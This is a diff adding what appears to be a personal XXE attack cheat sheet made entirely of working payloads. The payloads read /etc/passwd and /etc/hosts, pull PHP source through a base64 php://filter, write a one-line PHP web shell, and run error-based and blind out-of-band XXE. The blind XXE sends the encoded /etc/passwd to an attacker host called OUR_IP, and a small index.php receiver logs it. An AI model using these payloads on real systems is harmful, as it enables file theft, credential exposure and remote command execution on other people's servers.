@@ -1,0 +1,50 @@
+LFI
+<!DOCTYPE email [
+<!ENTITY company SYSTEM "file:///etc/passwd">
+]>
+
+base64 LFI
+<!DOCTYPE email [
+<!ENTITY company SYSTEM "php://filter/	   
+convert.base64-encode/resource=index.php">
+]>
+					
+					
+RCE 
+echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+sudo python3 -m http.server 80
+	 		
+Advanced file disclosure
+error based XXE
+DTD file
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+				
+				
+<!DOCTYPE email [ 
+<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+%remote;
+%error;
+]>
+				
+blind XXE
+DTD file
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+
+
+index.php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
